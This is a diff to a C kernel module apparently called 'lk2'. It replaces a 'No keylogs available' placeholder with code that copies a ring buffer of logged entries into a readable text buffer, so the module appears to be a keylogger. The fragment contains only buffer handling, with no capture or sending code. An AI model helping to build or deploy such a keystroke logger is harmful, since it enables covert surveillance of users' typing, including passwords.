@@ -9,20 +9,53 @@ struct lk2_ring g_lk2_ring;
 
 static int lk2_build_snapshot(char **out_buf, size_t *out_len)
 {
-	static const char placeholder[] =
-		"No keylogs available (snapshot not implemented)\n";
-	char *buf;
+	struct lk2_entry *tmp = NULL;
+	u32 n, i;
+	size_t cap = 0, pos = 0;
+	char *buf = NULL;
 
-	if (!out_buf || !out_len)
-		return -EINVAL;
+	n = lk2_ring_count(&g_lk2_ring);
+	if (n == 0)
+	{
+		*out_buf = kstrdup("", GFP_KERNEL);
+		if (!*out_buf)
+			return -ENOMEM;
+		*out_len = 0;
+		return 0;
+	}
 
-	buf = kvmalloc(sizeof(placeholder), GFP_KERNEL);
-	if (!buf)
+	tmp = kcalloc(n, sizeof(*tmp), GFP_KERNEL);
+	if (!tmp)
 		return -ENOMEM;
 
-	memcpy(buf, placeholder, sizeof(placeholder));
+	n = lk2_ring_snapshot(&g_lk2_ring, tmp, n);
+
+	// Conservative capacity: max line length per entry + NUL
+	cap = (size_t)n * (size_t)LK2_MAX_LINE_LEN + 1;
+	buf = kvmalloc(cap, GFP_KERNEL);
+	if (!buf)
+	{
+		kfree(tmp);
+		return -ENOMEM;
+	}
+
+	for (i = 0; i < n; i++)
+	{
+		pos += lk2_format_line(&tmp[i], buf + pos, cap - pos);
+		if (pos >= cap)
+			break;
+	}
+
+	// Ensure NUL termination for safety (read path uses len)
+	if (pos < cap)
+		buf[pos] = '\0';
+	else
+		buf[cap - 1] = '\0';
+
 	*out_buf = buf;
-	*out_len = sizeof(placeholder) - 1;
+	*out_len = pos;
+
+	kfree(tmp);
 	return 0;
 }
 
